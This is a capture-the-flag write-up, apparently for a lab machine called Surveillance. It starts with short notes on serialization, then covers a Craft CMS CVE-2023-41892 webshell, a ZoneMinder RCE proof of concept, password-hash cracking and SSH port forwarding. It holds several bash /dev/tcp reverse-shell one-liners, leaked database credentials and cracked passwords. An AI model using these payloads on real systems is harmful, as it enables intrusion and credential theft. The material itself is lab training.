
#### **1. What is Serialization?**

Serialization is the process of converting a **complex data structure (like an object or an array)** into a format that can be stored or transmitted easily. This format is typically a string or binary representation.

- Used for **saving data to files, databases, or sending it over a network.**
- Common serialization formats:
    - **JSON** (`{"name": "Alice", "age": 25}`)
    - **XML** (`<person><name>Alice</name><age>25</age></person>`)
    - **PHP Serialized Format** (`O:4:"User":2:{s:4:"name";s:5:"Alice";s:3:"age";i:25;}`)

---

#### **2. What is Deserialization?**

Deserialization is the reverse of serialization. It **converts the serialized string or binary data back into an object or data structure** that can be used by the program
-A web application receives a **serialized object** from a user.
-The application **deserializes it** to process the data.

---
#### **initial Foothold: Exploiting Craft CMS (CVE-2023-41892) via PHP Object Injection**

Craft CMS is a content management system that stores data in a structured manner using PHP-based object serialization and deserialization. The vulnerability, **CVE-2023-41892**, exists in how Craft CMS handles unserialized user input. If an attacker can control serialized input, they can exploit **PHP object injection** to execute arbitrary code.

---
then we will have .backup , hash for user zone minder , or we can read configurations access databases, change password ,access !


## Enumeration

10.10.11.245
```bash
┌──(pwn㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- -T4 10.10.11.245
[sudo] password for pwn: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 00:36 EST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.86% done
Nmap scan report for 10.10.11.245
Host is up (0.076s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
-edit /etc/hosts
```bash
┌──(pwn㉿kali)-[~]
└─$ sudo gedit /etc/hosts  + surveillance.htb
```
-check http://surveillance.htb/
-Powered by Craft CMS 4.4.14
-search exploit CMS 4.4.14
https://github.com/0xfalafel/CraftCMS_CVE-2023-41892

```bash
┌──(pwn㉿kali)-[~/Surveillance]
└─$ sudo python3 exploit.py http://surveillance.htb
/home/pwn/Surveillance/exploit.py:68: SyntaxWarning: invalid escape sequence '\e'
  "configObject[class]": "craft\elements\conditions\ElementCondition",
[+] Executing phpinfo to extract some config infos
temporary directory: /tmp
web server root: /var/www/html/craft/web
[+] create shell.php in /tmp
[+] trick imagick to move shell.php in /var/www/html/craft/web

[+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami
[+] Remember to delete shell.php in /var/www/html/craft/web when you're done

[!] Enjoy your shell

> whoami
www-data

> bash -c 'bash -i >& /dev/tcp/10.10.14.2/9999 0>&1'

```

```bash
sudo nc -nlvp 9999

```

```bash
──(pwn㉿kali)-[~/Surveillance]
└─$ nc -lvnp 9999               
listening on [any] 9999 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.245] 58242
bash: cannot set terminal process group (1088): Inappropriate ioctl for device
bash: no job control in this shell
www-data@surveillance:~/html/craft/web$ ls

```

```bash
www-data@surveillance:~/html/craft/web$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<eb$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@surveillance:~/html/craft/web$ ^Z
zsh: suspended  nc -lvnp 9999
                                                                                                                  
┌──(pwn㉿kali)-[~/Surveillance]
└─$ stty raw -echo ;fg
[1]  + continued  nc -lvnp 9999

www-data@surveillance:~/html/craft/web$ ls
cpresources  css  fonts  images  img  index.php  js  shell.php  web.config
www-data@surveillance:~/html/craft/web$ 

```
https://craftcms.com/docs/4.x/config/db.html
```bash
www-data@surveillance:~/html/craft$ cat .env
# Read about configuration, here:
# https://craftcms.com/docs/4.x/config/

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=production

# The secure key Craft will use for hashing and encrypting data
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_

# Database connection settings
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craftdb
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftCMSPassword2023!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

# General settings (see config/general.php)
DEV_MODE=false
ALLOW_ADMIN_CHANGES=false
DISALLOW_ROBOTS=false

PRIMARY_SITE_URL=http://surveillance.htb/

```

```bash
www-data@surveillance:~/html/craft$ mysql -u craftuser -p

MariaDB [craftdb]> select user, password from users;
ERROR 1054 (42S22): Unknown column 'user' in 'field list'
MariaDB [craftdb]> select users, password from users;
ERROR 1054 (42S22): Unknown column 'users' in 'field list'
MariaDB [craftdb]> select email, password from users;
---

$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe


```
`$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe`
admin
```bash
┌──(pwn㉿kali)-[~/Surveillance]
└─$ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force 
 nothing to worry about skip


```

```bash
cat surveillance--2023-10-17-202801--v4.4.14.sql

`INSERT INTO 'users'` sql command

INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
commit;

```

```
Matthew
39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec


```

```bash
┌──(pwn㉿kali)-[~/Surveillance]
└─$ hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force 

39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
```
starcraft122490
Matthew
```bash
┌──(pwn㉿kali)-[~/Surveillance]
└─$ ssh matthew@10.10.11.245
matthew@10.10.11.245's password: 

ssh -4 -L 9991:127.0.0.1:8080 matthew@surveillance
any traffic come to 9991 to localhost will be redirected to 8080 matthew
```
## `pwn` host
```bash
matthew@surveillance:~$ ls
user.txt
matthew@surveillance:~$ cat user.txt 
0ab---------------------------------c6
matthew@surveillance:~$ 

```
running linpeas.sh is good practice
```bash

matthew@surveillance:~$ ss -lntp
LISTEN       0            511                    127.0.0.1:8080                   0.0.0.0:*                        
matthew@surveillance:~$ 

```
-port 8080 not visible public
-port forword
```bash
┌──(pwn㉿kali)-[~]
└─$ ssh -L 8080:127.0.0.1:8080 matthew@10.10.11.245
in web
http://127.0.0.1:8080/
login with admin + starcraft122490
```

https://www.exploit-db.com/exploits/51902

ZoneMinder Snapshots < 1.37.33 - Unauthenticated RCE

---
https://github.com/heapbytes/CVE-2023-26035
```bash
┌──(pwn㉿kali)-[~/Surveillance]
└─$ python3 poc.py -h
usage: poc.py [-h] --target TARGET --cmd CMD

ZoneMinder Exploit

options:
  -h, --help       show this help message and exit
  --target TARGET  Target URI (e.g., http://example.com/zm/)
  --cmd CMD        Command to execute on the target
                                                                                                                   
```

```bash
┌──(pwn㉿kali)-[~/Surveillance]

python3 poc.py --target http://127.0.0.1:8080/ --cmd "bash -c 'bash -i >& /dev/tcp/10.10.14.2/9997 0>&1'"

Fetching CSRF Token
Got Token: key:b4d3ab3c2fc8d689657369da602aa76842b844d4,1739346967
[>] Sending payload..
[!] Script executed by out of time limit (if u used revshell, this will exit the script)
                                                                                                                   
┌──(pwn㉿kali)-[~/Surveillance]
nc -nlvp 9997
```

```bash
zoneminder@surveillance:~$ sudo -l
sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *

```

```bash

`#!/bin/bash  
bash -i >& /dev/tcp/10.10.14.2/8887 0>&1`
```
## `pwn` root


